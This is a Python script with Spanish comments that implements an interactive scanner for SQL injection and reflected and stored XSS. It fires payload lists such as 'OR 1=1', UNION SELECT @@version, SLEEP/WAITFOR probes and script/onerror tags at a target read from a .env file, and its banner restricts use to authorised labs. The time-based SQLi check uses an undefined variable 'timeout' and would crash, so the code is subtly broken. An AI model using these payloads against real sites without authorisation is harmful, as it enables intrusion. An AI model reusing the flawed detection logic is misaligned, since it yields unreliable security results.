import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from tqdm import tqdm
import time
import re
from decouple import config # Importar config para leer el .env

# Cargar el objetivo desde el .env
TARGET = config('TARGET')

class WebVulnScanner:
    """
    Herramienta especializada para detectar SQL Injection y XSS (Reflected, Stored).
    Diseñada para pruebas controladas en entornos de laboratorio.
    """
    def __init__(self, base_url: str):
        # Validar que la URL base es válida y tiene esquema
        parsed_url = urlparse(base_url)
        if not parsed_url.scheme or not parsed_url.netloc:
            raise ValueError(f"URL base '{base_url}' no es válida o no tiene un esquema (ej. http:// o https://).")
            
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities_found = []
        self.common_sql_errors = [ # Errores SQL comunes para detección basada en errores
            "mysql_fetch_array", "ORA-01756", "Microsoft OLE DB", "SQL syntax",
            "You have an error in your SQL syntax", "Warning: mysql_fetch_array()",
            "SQLSTATE", "ODBC SQL", "PostgreSQL query failed", "supplied argument is not a valid MySQL"
        ]
        
        # Payloads de XSS
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83))//", # Hex/ASCII bypass
            "<body onload=alert('XSS')>"
        ]
        # Indicadores de XSS para buscar en la respuesta
        self.xss_indicators = [
            "alert('XSS')", "<script>alert('XSS')</script>", "javascript:alert"
        ]

    def _send_request(self, method: str, url: str, params: dict = None, data: dict = None, json: dict = None, timeout: int = 5):
        """
        Método auxiliar para enviar peticiones HTTP/HTTPS con manejo básico de errores.
        """
        try:
            if method.lower() == 'get':
                response = self.session.get(url, params=params, timeout=timeout)
            elif method.lower() == 'post':
                response = self.session.post(url, data=data, json=json, timeout=timeout)
            else:
                print(f"[*] Método HTTP no soportado: {method}")
                return None
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            # print(f"[*] Error HTTP {e.response.status_code} al acceder a {url}: {e.response.text[:100]}...")
            return e.response
        except requests.exceptions.ConnectionError as e:
            print(f"[*] Error de conexión a {url}: {e}")
            return None
        except requests.exceptions.Timeout:
            print(f"[*] Timeout al acceder a {url}")
            return None
        except Exception as e:
            print(f"[*] Error inesperado al enviar petición a {url}: {e}")
            return None

    def check_sql_injection(self, url: str, form_params: dict = None, query_params: dict = None):
        """
        Testea SQL Injection basada en errores o en patrones de respuesta booleana.
        
        url: La URL del endpoint a testear.
        form_params: Un diccionario de parámetros POST del formulario.
        query_params: Un diccionario de parámetros GET en la URL (query string).
        """
        print(f"\n--- Probando SQL Injection en: {url} ---")
        payloads_to_test = [
            "' OR '1'='1 --",
            "' OR '1'='2 --",
            "\" OR \"1\"=\"1 --",
            "\" OR \"1\"=\"2 --",
            "admin'--",
            "admin' OR 1=1 --",
            "1 OR 1=1",
            "1 AND 1=2",
            "'; WAITFOR DELAY '00:00:05'--", # Time-based (MS SQL Server)
            " UNION SELECT NULL,NULL,NULL,NULL--", # Union-based (ajustar NULLES)
            "' UNION SELECT @@version,NULL,NULL,NULL--", # Para obtener versión de BD
            " AND (SELECT SLEEP(5))--" # Time-based (MySQL/PostgreSQL)
        ]
        
        vulnerable_params = []

        # Determinar si es GET o POST
        is_get = query_params is not None
        is_post = form_params is not None

        # Si no hay parámetros para testear, intentamos obtenerlos de la URL si es GET
        if is_get and not query_params:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            # Convertir listas de parse_qs a valores individuales
            query_params = {k: v[0] for k, v in query_params.items()}


        target_params = query_params if is_get else form_params
        if not target_params:
            print("[*] No se encontraron parámetros testeables para SQLi.")
            return

        total_tests = len(payloads_to_test) * len(target_params)
        with tqdm(total=total_tests, desc="Testeando SQLi", unit="payloads", ncols=80) as pbar:
            for param_name, original_value in target_params.items():
                for payload in payloads_to_test:
                    test_params = target_params.copy()
                    test_params[param_name] = original_value + payload
                    
                    response = None
                    if is_get:
                        response = self._send_request('get', url, params=test_params)
                    elif is_post:
                        response = self._send_request('post', url, data=test_params)

                    if response:
                        # Detección basada en errores
                        for error_pattern in self.common_sql_errors:
                            if error_pattern.lower() in response.text.lower():
                                vulnerability_details = {
                                    "type": "SQL Injection (Error-based)",
                                    "url": url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "proof": f"Error pattern '{error_pattern}' found."
                                }
                                self.vulnerabilities_found.append(vulnerability_details)
                                print(f"\n[!!!] SQLi (Error-based) detectado en '{param_name}' con payload: {payload}")
                                pbar.colour = 'red'
                                break
                        
                        # Detección basada en tiempo (para Blind SQLi)
                        if "WAITFOR DELAY" in payload or "SLEEP" in payload:
                            start_time = time.time()
                            if is_get:
                                response_time_based = self._send_request('get', url, params=test_params)
                            elif is_post:
                                response_time_based = self._send_request('post', url, data=test_params)

                            if response_time_based:
                                end_time = time.time()
                                elapsed_time = end_time - start_time
                                if elapsed_time > timeout + 3:
                                    vulnerability_details = {
                                        "type": "SQL Injection (Time-based Blind)",
                                        "url": url,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "proof": f"Response took {elapsed_time:.2f} seconds (expected around {timeout}s)."
                                    }
                                    self.vulnerabilities_found.append(vulnerability_details)
                                    print(f"\n[!!!] SQLi (Time-based Blind) detectado en '{param_name}' con payload: {payload}")
                                    pbar.colour = 'red'
                    
                    pbar.update(1)

    def check_xss_reflected(self, url: str, form_params: dict = None, query_params: dict = None):
        """
        Testea XSS Reflected (no persistente) inyectando payloads y buscando su reflejo.
        """
        print(f"\n--- Probando XSS Reflected en: {url} ---")
        
        # Determinar si es GET o POST
        is_get = query_params is not None
        is_post = form_params is not None

        if is_get and not query_params:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params = {k: v[0] for k, v in query_params.items()}

        target_params = query_params if is_get else form_params
        if not target_params:
            print("[*] No se encontraron parámetros testeables para XSS Reflected.")
            return

        total_tests = len(self.xss_payloads) * len(target_params)
        with tqdm(total=total_tests, desc="Testeando XSS Reflected", unit="payloads", ncols=80) as pbar:
            for param_name, original_value in target_params.items():
                for payload in self.xss_payloads:
                    test_params = target_params.copy()
                    test_params[param_name] = payload
                    
                    response = None
                    if is_get:
                        response = self._send_request('get', url, params=test_params)
                    elif is_post:
                        response = self._send_request('post', url, data=test_params)

                    if response and response.status_code == 200:
                        response_text_lower = response.text.lower()
                        for indicator in self.xss_indicators:
                            if indicator.lower() in response_text_lower:
                                vulnerability_details = {
                                    "type": "XSS Reflected",
                                    "url": url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "proof": f"Payload '{payload}' or indicator '{indicator}' reflected in response."
                                }
                                self.vulnerabilities_found.append(vulnerability_details)
                                print(f"\n[!!!] XSS Reflected detectado en '{param_name}' con payload: {payload}")
                                pbar.colour = 'red'
                                break
                    pbar.update(1)

    def check_xss_stored(self, submit_url: str, view_url: str, submit_params: dict = None):
        """
        Simula la detección de XSS Stored.
        Requiere una URL para enviar el payload (submit_url) y otra para visualizarlo (view_url).
        """
        print(f"\n--- Probando XSS Stored (simulado) en: {submit_url} ---")

        if not submit_params:
            print("[*] No se proporcionaron parámetros para el envío de XSS Stored.")
            return

        payload = "<script>alert('XSS_Stored')</script>"

        total_tests = len(submit_params)
        with tqdm(total=total_tests, desc="Testeando XSS Stored", unit="payloads", ncols=80) as pbar:
            for param_name, original_value in submit_params.items():
                test_params = submit_params.copy()
                test_params[param_name] = payload
                
                print(f"\n[*] Enviando payload XSS Stored a '{param_name}' en {submit_url}...")
                submit_response = self._send_request('post', submit_url, data=test_params)
                
                if submit_response and submit_response.status_code < 400:
                    print(f"[*] Payload enviado. Verificando reflejo en {view_url}...")
                    time.sleep(1)

                    view_response = self._send_request('get', view_url)
                    
                    if view_response and view_response.status_code == 200:
                        if payload.lower() in view_response.text.lower():
                            vulnerability_details = {
                                "type": "XSS Stored (Simulated)",
                                "submit_url": submit_url,
                                "view_url": view_url,
                                "parameter": param_name,
                                "payload": payload,
                                "proof": f"Payload '{payload}' found in {view_url} after submission."
                            }
                            self.vulnerabilities_found.append(vulnerability_details)
                            print(f"\n[!!!] XSS Stored detectado (simulado) en '{param_name}'.")
                            pbar.colour = 'red'
                        else:
                            print(f"[*] Payload no reflejado en {view_url}.")
                    else:
                        print(f"[*] No se pudo acceder a la URL de visualización: {view_url}")
                else:
                    print(f"[*] Falló el envío del payload a {submit_url}.")
                pbar.update(1)

    def generate_report(self):
        """
        Genera un reporte simple de las vulnerabilidades encontradas.
        """
        print("\n=== REPORTE DE VULNERABILIDADES ===")
        if not self.vulnerabilities_found:
            print("No se encontraron vulnerabilidades.")
            return

        for i, vuln in enumerate(self.vulnerabilities_found):
            print(f"\n--- Vulnerabilidad {i+1} ---")
            print(f"Tipo: {vuln['type']}")
            print(f"URL Afectada: {vuln.get('url') or vuln.get('submit_url')}")
            if 'parameter' in vuln:
                print(f"Parámetro: {vuln['parameter']}")
            print(f"Payload Utilizado: {vuln['payload']}")
            print(f"Evidencia: {vuln['proof']}")
            print("-" * 30)
        print("\nReporte de vulnerabilidades completado.")

# --- EJECUCIÓN DEL SCRIPT ---

# Ignorar la advertencia de urllib3 (LibreSSL) en macOS si aparece
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')

if __name__ == "__main__":
    print("=== Herramienta de Detección de Vulnerabilidades Web (SQLi, XSS) ===")
    print("¡ADVERTENCIA! Usa esta herramienta SOLO en entornos de laboratorio autorizados (ej. DVWA, WebGoat, OWASP Juice Shop).")
    print("La URL base se carga desde la variable 'TARGET' en tu archivo .env.")

    # La URL base ahora se toma de la variable global TARGET del .env
    target_base_url = TARGET 
    
    scanner = WebVulnScanner(target_base_url)

    print("\n--- Selecciona las pruebas a realizar ---")
    run_sqli = input("¿Deseas probar SQL Injection? (s/n): ").lower() == 's'
    run_xss_reflected = input("¿Deseas probar XSS Reflected? (s/n): ").lower() == 's'
    run_xss_stored = input("¿Deseas probar XSS Stored (simulado)? (s/n): ").lower() == 's'

    if run_sqli:
        print("\nPara SQL Injection, la herramienta necesita saber si los parámetros están en GET o POST.")
        sqli_method = input(f"¿Los parámetros para SQLi son GET o POST para {target_base_url}? (get/post): ").lower()
        if sqli_method == 'get':
            # Ejemplo: si TARGET es http://localhost/dvwa/, el usuario ingresaría /vulnerabilities/sqli/?id=1&Submit=Submit
            # O directamente la URL completa si es de otro host
            sqli_path = input("Ingresa la RUTA O URL COMPLETA del endpoint con parámetros GET (ej. /vulnerabilities/sqli/): ")
            # Combinamos la base_url con la ruta ingresada
            full_sqli_url = urljoin(scanner.base_url, sqli_path)
            scanner.check_sql_injection(full_sqli_url, query_params={})
        elif sqli_method == 'post':
            sqli_path = input("Ingresa la RUTA O URL COMPLETA del endpoint POST (ej. /login.php): ")
            full_sqli_url = urljoin(scanner.base_url, sqli_path)
            print("Se necesitan los nombres de los parámetros POST y un valor inicial. Ej: username, password")
            param_names_input = input("Nombres de parámetros POST separados por coma (ej. username,password): ")
            form_data = {}
            for name in param_names_input.split(','):
                form_data[name.strip()] = "test_value"
            scanner.check_sql_injection(full_sqli_url, form_params=form_data)
        else:
            print("Método inválido para SQL Injection.")

    if run_xss_reflected:
        print("\nPara XSS Reflected, la herramienta necesita saber si los parámetros están en GET o POST.")
        xss_reflected_method = input(f"¿Los parámetros para XSS Reflected son GET o POST para {target_base_url}? (get/post): ").lower()
        if xss_reflected_method == 'get':
            xss_reflected_path = input("Ingresa la RUTA O URL COMPLETA del endpoint con parámetros GET (ej. /vulnerabilities/xss_r/): ")
            full_xss_reflected_url = urljoin(scanner.base_url, xss_reflected_path)
            scanner.check_xss_reflected(full_xss_reflected_url, query_params={})
        elif xss_reflected_method == 'post':
            xss_reflected_path = input("Ingresa la RUTA O URL COMPLETA del endpoint POST (ej. /comments.php): ")
            full_xss_reflected_url = urljoin(scanner.base_url, xss_reflected_path)
            print("Se necesitan los nombres de los parámetros POST y un valor inicial. Ej: comment, name")
            param_names_input = input("Nombres de parámetros POST separados por coma (ej. field1,field2): ")
            form_data = {}
            for name in param_names_input.split(','):
                form_data[name.strip()] = "test_value"
            scanner.check_xss_reflected(full_xss_reflected_url, form_params=form_data)
        else:
            print("Método inválido para XSS Reflected.")

    if run_xss_stored:
        print("\nPara XSS Stored (simulado), se necesita una URL de envío y una de visualización.")
        xss_submit_path = input("Ingresa la RUTA O URL COMPLETA donde se envía el contenido (ej. /post_comment.php): ")
        xss_view_path = input("Ingresa la RUTA O URL COMPLETA donde se visualiza el contenido (ej. /view_comments.php): ")
        
        full_xss_submit_url = urljoin(scanner.base_url, xss_submit_path)
        full_xss_view_url = urljoin(scanner.base_url, xss_view_path)

        print("Se necesitan los nombres de los parámetros POST para el envío. Ej: comment, author")
        submit_param_names = input("Nombres de parámetros POST para envío (ej. content,username): ")
        submit_data = {}
        for name in submit_param_names.split(','):
            submit_data[name.strip()] = "initial_test_value"
        scanner.check_xss_stored(full_xss_submit_url, full_xss_view_url, submit_data)
        
    scanner.generate_report()
    print("\n--- Detección de vulnerabilidades web completada ---")